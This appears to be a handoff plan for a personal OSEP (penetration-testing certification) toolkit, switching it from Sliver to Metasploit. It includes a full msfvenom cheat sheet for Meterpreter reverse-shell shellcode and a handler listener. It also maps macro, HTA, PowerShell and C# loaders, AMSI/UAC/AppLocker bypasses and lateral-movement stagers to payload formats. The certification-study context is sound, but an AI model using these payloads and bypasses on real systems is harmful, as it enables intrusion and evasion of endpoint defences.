# Handoff — osep-tools: Sliver → Metasploit

> **Decision:** Stick with Metasploit for OSEP. De-Sliver the repo. The Rust repo is **out of scope** (not exam-relevant).

## Context: original repo vs local fork (why this is mostly a "revert")

Comparing `darkness215/osep-tools` (original) with the local fork:

| Thing | Original repo | Local fork |
|---|---|---|
| `README.md` Requirements table | `msfvenom` / Sliver (msfvenom **first**) | **Sliver** (primary), msfvenom removed |
| `RUNBOOK.md` | ❌ doesn't exist | ✅ Sliver-centric runbook |
| `nimsyscallpacker/` | ❌ | ✅ Sliver-specific (packs "Sliver shellcode") |
| `applocker/`, `cs-loaders/`, `lateral-movement/` | ❌ | ✅ (these are **C2-agnostic**, keep them) |
| `hta-delivery/` | single HTA (bitsadmin/InstallUtil) | `red.hta` (PS cradle) + `black.hta` (InstallUtil) |

**Key insight:** the original repo was already `msfvenom`-first and C2-agnostic. The fork *added* the Sliver bias (RUNBOOK, nimsyscallpacker, README rewrite). The technique code (VBA/C#/PS) never depended on Sliver — it just takes raw shellcode or byte arrays. The migration is therefore mostly **documentation/comment rewrites**, not code changes.

---

## Task 1 — Make `README.md` + `RUNBOOK.md` msfvenom-first

### 1a. `README.md`
- [ ] Revert the **Requirements** table to match the original:
  - `msfvenom` / `msfconsole` → generate shellcode, payloads, and stagers
  - `Python 3` → encryption scripts, HTTP server
  - `.NET SDK` → compile C# runners
  - `Visual Studio / VS Code` → build C# projects (Release, x64)
  - Keep `Sliver` only as an *optional secondary C2* (one line, clearly optional).
- [ ] Rewrite the `nimsyscallpacker/` blurb: note it packs **raw shellcode / PE / C#** (so it accepts `msfvenom -f raw` output too), and mark it *optional / EDR-escalation only*.
- [ ] Update the `hta-delivery/` blurb to describe both files (`red.hta` = in-memory PS cradle, `black.hta` = bitsadmin + InstallUtil) — already largely done, just remove any Sliver-only wording.
- [ ] Remove the intro line's claim that the toolkit "replaces msfvenom/meterpreter."

### 1b. `RUNBOOK.md`
- [ ] **Section 0 (C2 setup)** → replace `sliver` listener commands with a `multi/handler`:
  ```bash
  # Staged (recommended default for OSEP)
  msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
  # Stageless
  msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
  ```
- [ ] **Section 2 (Generate shellcode)** → replace every `sliver > generate ...` with the `msfvenom` equivalents from Task 2.
- [ ] Replace the transport table (`mtls/https/http/wg/dns`) with Metasploit equivalents (`reverse_tcp` / `reverse_https` / `reverse_http`), noting `reverse_https` blends into TLS/443.
- [ ] Update the "one-line mental model" to say "`msfvenom` → generate" instead of "`sliver > generate`."

### 1c. Sweep remaining Sliver references (mechanical, all files)
- [ ] `aes-loaders/aes-shellcode-encryption/aes-shellcode-encryption.cs` — header comment line 4: `sliver > generate ... --format csharp` → `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp`.
- [ ] `aes-loaders/aes-normal-runner/…` + other `aes-loaders/*` headers — same swap.
- [ ] `word-macro/xor-shellcode-runner/xor-shellcode-encryption-3-byte.cs` — line 17 comment swap.
- [ ] `ps-loaders/ps-shellcode-runner.ps1` — header lines 5/9 already mix Sliver + msfvenom; make msfvenom primary.
- [ ] `cs-loaders/README.md` — swap the `sliver > generate` lines for `msfvenom` (see Task 2).
- [ ] `nimsyscallpacker/README.md` — replace "packs Sliver shellcode" with "packs msfvenom raw shellcode (`-f raw`)"; keep the Nim build steps.

---

## Task 2 — Add `MSFVENOM.md` (payload-generation cheat sheet)

New file at repo root. Content skeleton:

```markdown
# msfvenom Cheat Sheet — osep-tools

## Raw shellcode (base blob)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin     # stageless (~200KB)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager.bin  # staged (~500B)
msfvenom -p windows/meterpreter_reverse_tcp    LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc32.bin    # x86 stageless
msfvenom -p windows/meterpreter/reverse_tcp    LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager32.bin

## Re-format existing raw → array (no re-encode)
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1    -o /tmp/sc.ps1
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba    -o /tmp/sc.vba

## Direct array output (no intermediate file)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f csharp
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f ps1
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f vbapplication
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f vba

## PowerShell script (for ps-loader.ps1 / red.hta / lateral-movement stagers)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 -f psh -o /tmp/payload.ps1

## Listener
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
```

| Loader | Input it expects | Generate with |
|---|---|---|
| `word-macro/caesar-cipher/` | VBA `Array()` (Caesar-encrypted) | raw → `vba-caesar-cipher-encryption.cs` → paste |
| `word-macro/xor-shellcode-runner/` | VBA `Warhead = Array()` (XOR-enc) | raw → `xor-shellcode-encryption-3-byte.cs` → paste |
| `word-macro/alternative-shellcode-runner/` | VBA array (XOR-enc) | same as XOR runner |
| `word-macro/installutil-applocker-bypass/` | .NET InstallUtil exe (downloads `run.txt`) | compile `installutil.cs`; `run.txt` = `-f psh` stager |
| `word-macro/recon/` | n/a (phone-home GET) | n/a |
| `aes-loaders/*` | C# `byte[] buf` (AES-encrypted) | raw → `aes-shellcode-encryption.cs` → paste encrypted buf |
| `amsi-bypass/` | inline PowerShell | n/a |
| `hta-delivery/red.hta` | PS cradle → `payload.ps1` | `-f psh` |
| `hta-delivery/black.hta` | bitsadmin + InstallUtil .NET | compile `installutil.cs` |
| `ps-loaders/ps-loader.ps1` | PS script (`payload.ps1`) | `-f psh` |
| `ps-loaders/ps-shellcode-runner.ps1` | raw `.bin` (DownloadData) **or** inline `ps1` array | `-f raw` or `-f ps1` |
| `uac-bypass/` | inline PS (set elevated payload) | `-f psh` |
| `applocker/msbuild-shellcode.xml` | inline C# task | `-f csharp` array |
| `applocker/regsvr32.sct` | scriptlet (PS) | `-f psh` / regsvr32 |
| `cs-loaders/` (nt/apc/dinvoke/unhook) | raw → C# `byte[] buf` | `-f csharp` or `generic/custom` |
| `lateral-movement/*` | PS stager (`run.ps1`) | `-f psh` |
| `nimsyscallpacker/` | raw shellcode / PE / C# | `-f raw` (stageless) |

> ⚠️ **VBA size limit:** stageless meterpreter (`meterpreter_reverse_tcp`) is ~200KB — too big for a single VBA module. For macros use the **staged** `windows/x64/meterpreter/reverse_tcp` stager (~500B) or a download cradle. C#/PS loaders that `DownloadData`/`DownloadString` at runtime can use either.


---

## Task 3 — Verify each loader's input format against `msfvenom` output

Confirm (no code change unless mismatched) that each loader's expected format equals what `msfvenom` emits:

- [ ] **C# loaders** (`aes-loaders/*`, `cs-loaders/*`): expect `byte[] buf = new byte[N] { 0x.., .. };` → matches `msfvenom -f csharp` (12 bytes/line, `0x` prefix). ✅
- [ ] **AES encryptor** (`aes-shellcode-encryption.cs`): takes a plain `byte[] shellcode` and emits the same C# `byte[] buf` format → feed it `msfvenom -f csharp` output. ✅
- [ ] **XOR encryptor** (`xor-shellcode-encryption-3-byte.cs`): takes `byte[] buf`, emits VBA `Warhead = Array(…)` → feed `msfvenom -f csharp` output; runner consumes `Warhead`. ✅
- [ ] **`ps-shellcode-runner.ps1`**: `[Byte[]] $buf = (DownloadData '…/sc.bin')` **or** inline `0xfc,0x48,…` → matches `-f raw` (hosted) or `-f ps1` (inline). ✅
- [ ] **`ps-loader.ps1` / `red.hta` / `lateral-movement` stagers**: expect a PS script to download/execute → matches `-f psh`. ✅
- [ ] **InstallUtil chain** (`installutil.cs`): downloads `amsi.txt` + `run.txt` → `run.txt`/`amsi.txt` = `msfvenom -f psh` output (or a PS AMSI-bypass + stager). ✅
- [ ] **`nimsyscallpacker`**: accepts raw shellcode → confirm it packs `msfvenom -f raw` (stageless) as well as it did Sliver raw. If it only hard-codes Sliver formats, mark it optional/out-of-scope.

**Verification run (do this in the lab before exam):**
1. Generate staged payload → host raw → confirm `ps-shellcode-runner.ps1` and `cs-loaders` get a session.
2. Generate stageless `meterpreter_reverse_tcp` → AES-encrypt → run `aes-normal-runner` → session.
3. Generate `-f psh` → serve as `payload.ps1` → run `ps-loader.ps1` → session.

---

## Out of scope
- ❌ Rust-for-Malware-Development (not exam-relevant; excluded per decision).
- ⚙️ (Optional) Deep `nimsyscallpacker` rebuild — only if Defender/EDR becomes the blocker in the challenge labs.

---

## Acceptance checklist
- [ ] No `sliver` commands remain in README.md or RUNBOOK.md (grep `sliver` → only "optional secondary C2" mentions).
- [ ] `MSFVENOM.md` exists and maps every loader to a working command.
- [ ] Every loader's input format is confirmed against `msfvenom` output (Task 3 table).
- [ ] A staged + stageless + PS-payload round-trip was validated in the lab.



